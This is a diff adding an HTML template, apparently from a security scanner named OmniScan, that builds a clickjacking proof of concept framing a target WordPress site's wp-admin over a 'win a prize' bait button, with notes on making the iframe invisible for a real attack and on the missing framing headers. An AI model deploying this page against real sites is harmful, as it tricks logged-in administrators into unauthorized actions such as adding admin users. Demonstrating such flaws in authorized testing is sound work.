@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Clickjacking PoC — OmniScan</title>
+<style>
+body { margin: 0; background: #1a1a2e; color: #fff; font-family: Arial; }
+h1 { text-align: center; color: #ff4757; margin-top: 20px; }
+p { text-align: center; color: #aaa; }
+.container { position: relative; width: 100%; height: 600px; margin-top: 20px; }
+iframe {
+    position: absolute; top: 0; left: 50%; transform: translateX(-50%);
+    width: 1200px; height: 600px; border: 2px solid #ff4757;
+    opacity: 0.3;
+    z-index: 2;
+}
+.bait {
+    position: absolute; top: 200px; left: 50%; transform: translateX(-50%);
+    z-index: 1;
+    background: #ff4757; color: white; padding: 20px 40px;
+    font-size: 24px; border-radius: 10px; cursor: pointer;
+    text-align: center;
+}
+.info {
+    max-width: 800px; margin: 20px auto; padding: 20px;
+    background: rgba(255,255,255,0.05); border-radius: 10px;
+}
+</style>
+</head>
+<body>
+<h1>🎯 Clickjacking Proof of Concept</h1>
+<p>Target: <b>{{ base_url }}</b></p>
+<p>The iframe below loads the target site. The bait button is positioned behind it.</p>
+<p>Set iframe opacity to 0 for real attack. Currently at 0.3 for demonstration.</p>
+
+<div class="container">
+    <div class="bait">🎁 Click here to win a prize!</div>
+    <iframe src="{{ base_url }}/wp-admin/" scrolling="yes"></iframe>
+</div>
+
+<div class="info">
+<h3>Attack Scenario</h3>
+<ol>
+<li>Attacker creates a page with an invisible iframe loading <code>{{ base_url }}/wp-admin/</code></li>
+<li>A "bait" button is positioned over a sensitive action (e.g., "Add Admin User")</li>
+<li>Victim (logged-in admin) clicks the bait → actually clicks inside wp-admin</li>
+<li>Result: Unauthorized actions performed as the admin</li>
+</ol>
+<h3>Why it works</h3>
+<p>Missing <code>X-Frame-Options</code> and <code>Content-Security-Policy: frame-ancestors</code> headers allow any site to embed this page in an iframe.</p>
+</div>
+</body>
+</html>
